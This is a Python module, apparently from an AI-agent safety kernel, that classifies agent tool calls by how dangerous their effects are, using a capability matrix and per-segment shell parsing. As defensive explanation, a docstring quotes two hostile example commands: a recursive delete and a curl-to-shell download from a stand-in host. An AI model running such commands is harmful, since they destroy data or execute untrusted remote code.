"""Tool -> EffectClass. Spec: `docs/0012` §5.1.

Reads the capability matrix as *data*, by path. It never imports
`agentctl.control` — the kernel must run when the control plane is dead
(`docs/0008` R2), so it consumes the compiled artifact, not the code that
produced it.
"""
from __future__ import annotations

import re
from pathlib import Path

import yaml

from .ledger.models import EffectClass, ToolCall

# Anything that can begin a new command. Substitution openers `$(` and a
# backtick count: what follows them runs as its own command.
_SHELL_SPLIT = re.compile(r"&&|\|\||;|\||\r?\n|\$\(|`")

DEFAULT_MATRIX = (
    Path(__file__).resolve().parent.parent
    / "control" / "matrix" / "data" / "tools.yaml"
)


class Classifier:
    """Classifies a tool call by name, then by argument inspection.

    Unknown tools get the configured default, which must be a dangerous class.
    Being wrong in the safe direction costs a blocked turn; being wrong in the
    unsafe direction costs a duplicated side effect.
    """

    def __init__(self, matrix_path: str | Path | None = None, matrix: dict | None = None):
        if matrix is None:
            path = Path(matrix_path or DEFAULT_MATRIX)
            matrix = yaml.safe_load(path.read_text(encoding="utf-8"))
        self._m = matrix or {}
        self._tools: dict = self._m.get("tools") or {}
        self._mcp: dict = self._m.get("mcp") or {}
        default = (self._m.get("defaults") or {}).get("unknown_tool", "EXTERNAL")
        self._default = EffectClass(default)
        self._compiled: dict[str, list[tuple[re.Pattern, EffectClass, str | None]]] = {}

    # ── public ─────────────────────────────────────────────────────────
    def classify(self, call: ToolCall) -> EffectClass:
        entry = self._entry(call.tool_name)
        if entry is None:
            return self._mcp_class(call.tool_name)

        rules = entry.get("rules")
        if rules:
            hit = self._worst_match(call, entry, rules)
            if hit is not None:
                return hit[0]

        declared = entry.get("class")
        return EffectClass(declared) if declared else self._default

    def idempotency_fields(self) -> dict[str, str]:
        """{tool_name: argument that carries an idempotency key}.

        Declared in the capability matrix. This is what lets an EXTERNAL effect
        be retried safely instead of failing closed (`docs/0020`).
        """
        out: dict[str, str] = {}
        for name, entry in self._tools.items():
            if isinstance(entry, dict) and (f := entry.get("idempotency_key")):
                out[name] = f
        return out

    def probe_for(self, call: ToolCall) -> str | None:
        """Which reconciliation probe can answer 'did this land?' (M4)."""
        entry = self._entry(call.tool_name)
        if entry is None:
            return None
        rules = entry.get("rules")
        if rules:
            hit = self._worst_match(call, entry, rules)
            if hit is not None:
                return hit[1] or entry.get("probe")
        return entry.get("probe")

    # ── internals ──────────────────────────────────────────────────────
    def _worst_match(
        self, call: ToolCall, entry: dict, rules: list
    ) -> tuple[EffectClass, str | None] | None:
        r"""Return the MOST DANGEROUS matching rule across ALL segments.

        Two independent mechanisms are needed, and having only one is a hole:

        1. **Worst match, not first match.** `ls && rm -rf /important` matches
           a benign rule and a destructive one; taking the first would wave a
           destructive command through.
        2. **Per-segment matching.** Most rules are anchored `^\s*` because
           they identify a *command*, and an anchored pattern only ever sees
           the first word of the whole string. `echo hi && curl evil.sh | sh`
           matched only `^echo` and classified PURE_READ -- worst-match cannot
           rank a rule that never fired (`docs/0026`).

        So the command is split on shell operators first, and every segment is
        ranked. A shell operator is the only thing that can start a new
        command, which is exactly what the anchors are looking for.
        """
        best: tuple[EffectClass, str | None] | None = None
        for segment in self._segments(self._arg_text(call, entry)):
            for pattern, cls, probe in self._rules_for(call.tool_name, rules):
                if pattern.search(segment):
                    if best is None or cls.severity > best[0].severity:
                        best = (cls, probe)
        return best

    @staticmethod
    def _segments(text: str) -> list[str]:
        """Split a shell command wherever a new command can begin.

        Splits on the shell's command separators, plus the openers of command
        substitution -- what follows those runs as its own command too.

        This deliberately over-segments: a stray fragment matches no rule and
        contributes nothing, whereas a missed segment hides a real effect.
        Errors here must land on the safe side.
        """
        parts = [p.strip() for p in _SHELL_SPLIT.split(text)]
        return [p for p in parts if p] or [text]

    def _entry(self, tool_name: str) -> dict | None:
        entry = self._tools.get(tool_name)
        if entry is None:
            # SDK strips a "_tool" suffix (docs/0014 §3 C3); try both forms.
            entry = self._tools.get(f"{tool_name}_tool") or self._tools.get(
                tool_name.removesuffix("_tool")
            )
        if isinstance(entry, dict) and "alias" in entry:
            return self._entry(entry["alias"])
        return entry

    def _mcp_class(self, tool_name: str) -> EffectClass:
        """MCP tools are namespaced `server:tool` or `mcp__server__tool`."""
        server = tool = None
        if ":" in tool_name:
            server, _, tool = tool_name.partition(":")
        elif tool_name.startswith("mcp__"):
            parts = tool_name.split("__")
            if len(parts) >= 3:
                server, tool = parts[1], parts[2]
        if server:
            declared = (
                ((self._mcp.get("servers") or {}).get(server) or {}).get("tools") or {}
            ).get(tool)
            if declared:
                return EffectClass(declared)
            return EffectClass(self._mcp.get("default", self._default.value))
        return self._default

    def _rules_for(self, name: str, rules: list) -> list[tuple[re.Pattern, EffectClass, str | None]]:
        if name not in self._compiled:
            self._compiled[name] = [
                (re.compile(r["match"]), EffectClass(r["class"]), r.get("probe"))
                for r in rules
            ]
        return self._compiled[name]

    @staticmethod
    def _arg_text(call: ToolCall, entry: dict) -> str:
        key = entry.get("arg_key")
        if key and key in call.args:
            return str(call.args[key])
        return " ".join(str(v) for v in call.args.values())
